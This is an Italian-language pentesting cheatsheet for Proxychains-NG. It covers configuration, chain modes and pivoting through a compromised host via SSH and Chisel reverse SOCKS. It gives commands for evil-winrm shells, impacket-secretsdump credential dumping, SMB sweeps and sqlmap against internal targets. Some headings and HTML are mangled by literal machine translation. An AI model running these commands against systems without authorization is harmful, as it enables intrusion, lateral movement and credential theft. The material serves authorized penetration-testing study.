<!-- language-home-navigation -->
[🏠 Home Page Italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# ⛓️ Proxychains - Cheatsheet completo

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ██████╗ ██████╗  ██████╗ ██╗  ██╗██╗   ██╗ ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗███████╗
  ██╔══██╗██╔══██╗██╔═══██╗╚██╗██╔╝╚██╗ ██╔╝██╔════╝██║  ██║██╔══██╗██║████╗  ██║██╔════╝
  ██████╔╝██████╔╝██║   ██║ ╚███╔╝  ╚████╔╝ ██║     ███████║███████║██║██╔██╗ ██║███████╗
  ██╔═══╝ ██╔══██╗██║   ██║ ██╔██╗   ╚██╔╝  ██║     ██╔══██║██╔══██║██║██║╚██╗██║╚════██║
  ██║     ██║  ██║╚██████╔╝██╔╝ ██╗   ██║   ╚██████╗██║  ██║██║  ██║██║██║ ╚████║███████║
  ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝
       Force Any TCP Connection Through SOCKS4, SOCKS5, and HTTP Proxies
```
<palign="centro">
  <img src="https://img.shields.io/badge/Proxychains-Proxychains--NG-blue?style=for-the-badge" alt="Proxychains">
  <img src="https://img.shields.io/badge/Category-Pivoting_&_Tunneling-orange?style=for-the-badge" alt="Pivoting e tunneling">
  <img src="https://img.shields.io/badge/Protocols-SOCKS4_SOCKS5_HTTP-green?style=for-the-badge" alt="Protocolli">
  <img src="https://img.shields.io/badge/License-GPLv2-red?style=for-the-badge" alt="Licenza GPLv2">
</p>

<palign="centro">
  <b>🌐 Instrada dinamicamente gli strumenti di rete CLI Linux standard tramite SOCKS multi-hop e proxy HTTP tramite LD_PRELOAD</b>
</p>

---

## 📋 Sommario

- [Panoramica e funzionamento di Proxychains](#-overview--how-proxychains-works)
- [Installazione](#-installazione)
- [File di configurazione e gerarchia di ricerca](#-configuration-files--lookup-hierarchy)
- [Spiegazione delle modalità di concatenamento](#-spiegazione delle modalità di concatenamento)
  - [`dynamic_chain` (consigliato)](#dynamic_chain-consigliato)
  - [`strict_chain`](#strict_chain)
  - [`round_robin_chain`](#round_robin_chain)
  - [`random_chain`](#catena_casuale)
- [Prevenzione perdite DNS (`proxy_dns`)](#-dns-leaks-prevention-proxy_dns)
- [Configurazione elenchi proxy](#-configuring-proxy-lists)
- [Flussi di lavoro pivotanti](#-flussi di lavoro pivotanti)
  - [Proxy SSH Dynamic SOCKS (`ssh -D`)](#ssh-dynamic-socks-proxy-ssh--d)
  - [Relè Scalpello e Ligolo-ng SOCKS](#chisel--ligolo-ng-socks-relay)
- [Integrazione degli strumenti e trucchi](#-tool-integration--gotchas)
  - [Nmap con Proxychains (perché `-sS` fallisce)](#nmap-with-proxychains-why--ss-fails)
  - [Strumenti di Active Directory (NetExec, Evil-WinRM, Impacket)](#active-directory-tools-netexec-evil-winrm-impacket)
- [Tabella di riferimento rapido](#-tabella-di-riferimento-rapido)
- [Considerazioni difensive e OPSEC](#-considerazioni-difensive--opsec)
- [Disclaimer legale](#-legal-disclaimer)

---

## 🎯 Panoramica e funzionamento di Proxychains

**Proxychains** (moderno fork attivo: **Proxychains-NG** / `proxychains4`) consente di eseguire qualsiasi comando dinamico tramite proxy SOCKS4, SOCKS5 o HTTP(S) singoli o multipli concatenati.

Funziona precaricando una libreria di hook personalizzata (`libproxychains4.so`) utilizzando il meccanismo di linker dinamico (`LD_PRELOAD`). Questo intercetta le chiamate API socket (`connect()`, `gethostbyname()`) effettuate dalle applicazioni di destinazione e reindirizza il loro traffico TCP nella catena proxy configurata in modo trasparente.

---

## 📥Installazione
```bash
# Debian / Ubuntu / Kali Linux
sudo apt update && sudo apt install -y proxychains4

# Arch Linux
sudo pacman -S proxychains-ng

# macOS (Homebrew)
brew install proxychains-ng
```
---

## ⚙️ File di configurazione e gerarchia di ricerca

Proxychains cerca il suo file di configurazione nel seguente rigoroso ordine di priorità:

1. Percorso impostato nella variabile di ambiente `PROXYCHAINS_CONF_FILE`.
2. File passato tramite il flag `-f` (`proxychains4 -f ./myproxy.conf <command>`).
3. `./proxychains.conf` nella directory di lavoro corrente.
4.`$(HOME)/.proxychains/proxychains.conf`.
5. `/etc/proxychains4.conf` (impostazione predefinita del sistema).

---

## 🔗 Spiegazione delle modalità di concatenamento

Modifica `/etc/proxychains4.conf` per scegliere l'algoritmo di instradamento della catena:

### `dynamic_chain` (consigliato)
Salta automaticamente i proxy morti nell'elenco senza interrompere la connessione. Se il proxy n. 1 è attivo, il proxy n. 2 è inattivo e il proxy n. 3 è attivo, il traffico viene instradato attraverso 1 -> 3.
```ini
dynamic_chain
# strict_chain
```
###`strict_chain`
Segue rigorosamente l'ordine proxy configurato. Se un proxy nella catena fallisce o va in timeout, l'intera connessione viene rifiutata.
```ini
strict_chain
```
###`round_robin_chain`
Scorre l'elenco dei proxy in sequenza per ogni nuova richiesta di connessione.
```ini
round_robin_chain
chain_len = 2
```
###`random_chain`
Seleziona casualmente i proxy dall'elenco fino a `chain_len`.

---

## 🛡️ Prevenzione perdite DNS (`proxy_dns`)

Uno degli errori OPSEC più pericolosi durante la ricognizione esterna o il pivoting interno è la perdita di query DNS verso l'ISP locale o il gateway di destinazione.

Assicurati che `proxy_dns` sia attivo in `/etc/proxychains4.conf`:
```ini
# Proxy all DNS requests through SOCKS5 proxy
proxy_dns

# Suppress annoying hook library stdout logs
quiet_mode
```
---

## 📝 Configurazione degli elenchi proxy

In fondo a `/etc/proxychains4.conf`, sotto `[ProxyList]`:
```ini
[ProxyList]
# Protocol   IP               Port   [Username]  [Password]
socks5       127.0.0.1        1080
socks4       192.168.1.100    1080
http         10.10.10.50      8080   admin       SecretPass123
```
---

## 🚀 Flussi di lavoro pivotanti

### Proxy SSH dinamico SOCKS (`ssh -D`)
```bash
# 1. Open background dynamic SOCKS5 proxy on local port 1080 through compromised pivot host
ssh -f -N -D 127.0.0.1:1080 user@10.10.10.50

# 2. Add entry to /etc/proxychains4.conf:
# socks5 127.0.0.1 1080

# 3. Access internal machines unreachable directly from attacker box
proxychains4 curl http://172.16.20.10
```
### Relè Scalpello e CALZINI Ligolo-ng

Quando si eseguono tunnel client-server Chisel:
```bash
# Connect Chisel client with reverse SOCKS
chisel client 10.10.14.5:8000 R:1080:socks

# Route tools through Chisel tunnel
proxychains4 crackmapexec smb 172.16.50.0/24
```
---

## ⚠️ Integrazione degli strumenti e trucchi

### Nmap con Proxychains (perché `-sS` fallisce)

> [!ATTENZIONE]
> I proxy SOCKS supportano solo sessioni TCP stabilite. **Le scansioni Stealth SYN (`-sS`) falliranno o si bloccheranno** perché richiedono la manipolazione del socket raw non supportata su SOCKS!
```bash
# Correct Nmap command with Proxychains (Full TCP Connect, No Ping, No DNS)
proxychains4 nmap -sT -Pn -n -sV -p 80,443,445,3389 172.16.20.10

# Scan Top 100 ports over proxy
proxychains4 nmap -sT -Pn -n --top-ports 100 172.16.20.10
```
### Strumenti di Active Directory (NetExec, Evil-WinRM, Impacket)
```bash
# SMB enumeration through internal pivot
proxychains4 nxc smb 172.16.20.10 -u Administrator -p 'Password123'

# WinRM shell through proxychains
proxychains4 evil-winrm -i 172.16.20.10 -u Administrator -p 'Password123'

# Impacket secretsdump over SOCKS proxy
proxychains4 impacket-secretsdump domain.local/Administrator:Pass@172.16.20.10 -no-pass
```
---

## ⚡ Tabella di consultazione rapida

| Obiettivo | Comando |
|-----------|---------|
| **Esegui comando tramite proxy** | `proxychains4 <command> [args]` |
| **File di configurazione personalizzato** | `proxychains4 -f ./custom.conf <command>` |
| **Esecuzione silenziosa (nessun banner)** | `proxychains4 -q <command>` |
| **Target interno scansione TCP** | `proxychains4 nmap -sT -Pn -n -p 80,445 <IP>` |
| **Richiesta Web interna** | `proxychains4 curl -i http://<INTERNAL_IP>` |
| **Test SQLMap interno** | `proxychains4 sqlmap -u "http://<IP>/id=1" --batch` |
| **Sonda NetExec interna** | `proxychains4 nxc smb <SUBNET>/24` |

---

## 🛡️ Considerazioni difensive e OPSEC

1. **Perdite DNS:** se `proxy_dns` viene commentato, il tuo sistema risolverà i nomi host tramite DNS locale, avvisando Blue Teams dei nomi host presi di mira.
2. **Velocità e latenza:** il concatenamento di più proxy aumenta il tempo di andata e ritorno (RTT). Imposta timeout ragionevoli (`tcp_read_time_out 15000`, `tcp_connect_time_out 8000`).
3. **Binari statici:** I binari compilati staticamente (ad esempio, i binari Go/Rust che non collegano `libc.so`) ignorano gli hook `LD_PRELOAD` e non verranno instradati attraverso Proxychain.

---

## ⚠️ Disclaimer legale

> [!ATTENZIONE]
> Questo cheatsheet è destinato esclusivamente ai test di penetrazione autorizzati, agli impegni del Red Team e alla ricerca educativa. È severamente vietato instradare il traffico senza autorizzazione.